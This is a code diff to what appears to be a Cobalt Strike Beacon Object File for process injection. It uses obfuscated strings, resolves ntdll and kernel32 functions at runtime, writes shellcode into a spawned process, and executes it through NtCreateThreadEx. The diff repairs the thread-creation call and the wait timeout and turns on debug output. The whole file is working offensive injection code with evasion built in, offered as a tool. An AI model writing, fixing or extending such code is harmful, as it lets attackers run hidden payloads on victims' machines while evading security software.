@@ -29,7 +29,6 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("ntdll.dll")), skCrypt("NtWaitForSingleObject"));
 	_CreatePipe CreatePipe = (_CreatePipe)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("kernel32.dll")), skCrypt("CreatePipe"));
 	_SetHandleInformation SetHandleInformation = (_SetHandleInformation)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("kernel32.dll")), skCrypt("SetHandleInformation"));
-	// _snprintf_t _snprintf = (_snprintf_t)GetSymbolAddress(GetModuleHandleEx2A(skCrypt("msvcrt.dll")), skCrypt("_snprintf")); 
 
 
 	NTSTATUS status = STATUS_SUCCESS;
@@ -121,10 +120,6 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 	status = NtWriteVirtualMemory(pi.hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
 	if (status != STATUS_SUCCESS) {
 		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to write shellcode to remote process\n"));
-
-
-
-
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -135,28 +130,24 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 	}
 	BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode written successfully\n"));
 	
-	HANDLE hThread = NULL;
+	HANDLE hThread = pi.hThread;
 
 	status = NtCreateThreadEx(
 		&hThread,
 		THREAD_ALL_ACCESS,
-		&oa, 
+		NULL,
 		pi.hProcess,
-		(LPTHREAD_START_ROUTINE)remoteBuffer,
 		remoteBuffer,
+		NULL,
 		FALSE,
-		NULL,
-		NULL,
-		NULL,
+		0,
+		0,
+		0,
 		NULL
 	);
 	if (status != STATUS_SUCCESS) {
 		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to create remote thread\n"));
 		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Error code: %x\n"), status);
-
-
-
-
 
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
@@ -170,11 +161,6 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 	status = NtResumeThread(hThread, NULL);
 	if (status != STATUS_SUCCESS) {
 		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[-] Failed to resume thread\n"));
-
-
-
-
-
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		CloseHandle(hReadPipe);
@@ -189,7 +175,7 @@ BOOL InjectNtCreateThreadEx(CHAR* processName, LPVOID shellcode, SIZE_T shellcod
 		LARGE_INTEGER timeout;
 		timeout.QuadPart = INFINITE;
 
-		status = NtWaitForSingleObject(hThread, FALSE, NULL);
+		status = NtWaitForSingleObject(hThread, FALSE, &timeout);
 
 		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Thread finished successfully\n"));
 		BeaconPrintf(CALLBACK_OUTPUT,skCrypt("[+] Shellcode executed successfully\n"));
@@ -700,10 +686,10 @@ extern "C" {
 			sc_len = BeaconDataLength(&parser);
 			sc_ptr = BeaconDataExtract(&parser, NULL);
 
-			// BeaconPrintf(CALLBACK_OUTPUT,CALLBACK_OUTPUT, skCrypt("Target Process: %s\n"), targetTechnique);
-			// BeaconPrintf(CALLBACK_OUTPUT,CALLBACK_OUTPUT, skCrypt("Target Process: %s\n"), targetProcess);
-			// BeaconPrintf(CALLBACK_OUTPUT,CALLBACK_OUTPUT, skCrypt("Shellcode Length: %d\n"), sc_len);
-			// BeaconPrintf(CALLBACK_OUTPUT,CALLBACK_OUTPUT, skCrypt("Shellcode Pointer: %p\n"), sc_ptr);
+			BeaconPrintf(CALLBACK_OUTPUT, skCrypt("Target Process: %s\n"), targetTechnique);
+			BeaconPrintf(CALLBACK_OUTPUT, skCrypt("Target Process: %s\n"), targetProcess);
+			BeaconPrintf(CALLBACK_OUTPUT, skCrypt("Shellcode Length: %d\n"), sc_len);
+			BeaconPrintf(CALLBACK_OUTPUT, skCrypt("Shellcode Pointer: %p\n"), sc_ptr);
 
 
 			if (strcmp(targetTechnique, skCrypt("NtCreateThreadEx")) == 0) {
